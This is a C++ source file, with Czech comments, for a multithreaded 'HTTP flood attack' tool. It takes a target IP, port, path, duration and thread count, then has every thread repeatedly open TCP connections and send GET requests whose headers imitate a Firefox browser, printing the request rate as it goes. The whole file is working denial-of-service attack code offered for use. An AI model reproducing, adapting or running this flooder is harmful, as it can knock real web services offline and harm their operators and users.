
#include "httpFlood.h"
#include <pthread.h>
#include <errno.h>


pthread_mutex_t mutex = PTHREAD_MUTEX_INITIALIZER;
int alive_threads;

pthread_mutex_t mutex_request_cnt = PTHREAD_MUTEX_INITIALIZER;
int request_cnt;

using namespace std;

httpFlood::httpFlood(int argc, char **argv){
	dstIpStr = NULL;
        dstPort = 80;
        threads_nbr = 1;
	path= "/";
        read_time = 20000; // microseconds
	
	/*if(getuid())
		fprintf(stderr, "WARNING: It's recommented to start this program as root.\nSet the ulimit 'open files' (-n) to a big number.\n\tulimit -n 99999\n\n");*/
	
	int c;
	while ((c = getopt(argc, argv, "d:D:p:v:T:")) != -1) 
	{
		switch (c)
		{
		
		case 'd':
			dstIpStr = optarg;
			break;
		case 'D':
			dstPort = atoi(optarg);
			break;
		case 'T':
			duration = atoi(optarg);
			break;
		case 'p':
			path = optarg;		// napriklad: /image54.jpg ...
			break;
		case 'v':
			threads_nbr = atoi(optarg);	
			break;   
                case 'r':
			read_time = atoi(optarg);	
			break;         
                       
		default:
			break; // zmenit na vypis napovedy
		}
	}
	
        printf("\n*-------------------- HTTP flood attack starts --------------------*\n"
        "Parameters of attack: \n"
        "Target IP: %s  Port: %d\nPath: %s\nDuration: %d\nNumber of threads: %d \n\n"
        , dstIpStr, dstPort, path, duration, threads_nbr);
        
	int count = 0, errno;
        
	char header[1024] = "GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nConnection: keep-alive\r\n\r\n"; 
	
	sprintf(sendBuf,header,path,dstIpStr);
        
        memset(&serveraddr, 0, sizeof(serveraddr));
        
        serveraddr.sin_addr.s_addr = inet_addr(dstIpStr);
        serveraddr.sin_family = AF_INET;
        serveraddr.sin_port = htons(dstPort);

}


void httpFlood::run(){


        pthread_t *threads = new pthread_t[threads_nbr];
	int rc;
	int i;
        int request_cnt_old = 0;
	httpFloodParams *params = new httpFloodParams[threads_nbr];
	alive_threads = threads_nbr;   
        request_cnt   = 0;

	for( i=0; i < threads_nbr; i++ ){
		
		params[i].id = i;
		params[i].serveraddr = &serveraddr;
		params[i].sendBuf = sendBuf;	
                params[i].read_time = read_time;
                
		rc = pthread_create(&threads[i], NULL, &httpFloodThread, (void*)&params[i]);
	
		if (rc){ 
			cout << "Error:unable to create thread," << rc << endl;
 			exit(-1);
		}
	}
        
        time_t startTime = time(NULL);
        
        while(1){
            time_t curTime = time(NULL);
            if((curTime-startTime)> duration){
                exit(0);
            }
            printf("\rVlaken:%8d\tHlavicek %10d:%10d/s\t\t\t\t\t", alive_threads, request_cnt,request_cnt-request_cnt_old);
            fflush(stdout);
            request_cnt_old = request_cnt;
            usleep(1000000);
        }
        
        
	pthread_exit(NULL);
}

void* httpFlood::httpFloodThread(void *threadid){
        int sock, errno, optval;
    
        struct httpFloodParams *params;
   	params = (struct httpFloodParams *) threadid;
        usleep(rand()%100000); // vyckani nahodneho casu v rozmezi 0-100 ms. Duvod? Aby vsechny pozadavky nebyly poslany ve stejnem intervalu.
        
        int error_cnt = 0;
        
        while(1){
		if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
                    if(error_cnt == 10){
                        pthread_mutex_lock(&mutex);
                        alive_threads--;                       
                        pthread_mutex_unlock(&mutex);			
                        return NULL;
                    }
		    else{
                        error_cnt++;
                        usleep(1000);
                        continue;
                    }
                }
                optval = 1;       
		if(setsockopt(sock, SOL_SOCKET, SO_KEEPALIVE, &optval, sizeof(optval)) < 0) {
                    if(error_cnt == 10){
                        pthread_mutex_lock(&mutex);
                        alive_threads--;                       
                        pthread_mutex_unlock(&mutex);			
                        return NULL;
                    }
		    else{
                        error_cnt++;
                        usleep(1000);
                        continue;
                    }
		}
			
		if(connect(sock, (struct sockaddr *)(params->serveraddr), sizeof(struct sockaddr_in))){
                    if(error_cnt == 10){
                        pthread_mutex_lock(&mutex);
                        alive_threads--;                       
                        pthread_mutex_unlock(&mutex);			
                        return NULL;
                    }
		    else{
                        error_cnt++;
                        usleep(1000);
                        continue;
                    }
		}
		
		int sockWriteBytes = send(sock, params->sendBuf, strlen(params->sendBuf), 0);
		
                pthread_mutex_lock(&mutex_request_cnt);
                request_cnt++;
                pthread_mutex_unlock(&mutex_request_cnt);	

		//usleep(20000);
                usleep(params->read_time);
		close(sock);
                error_cnt = 0;
	}
}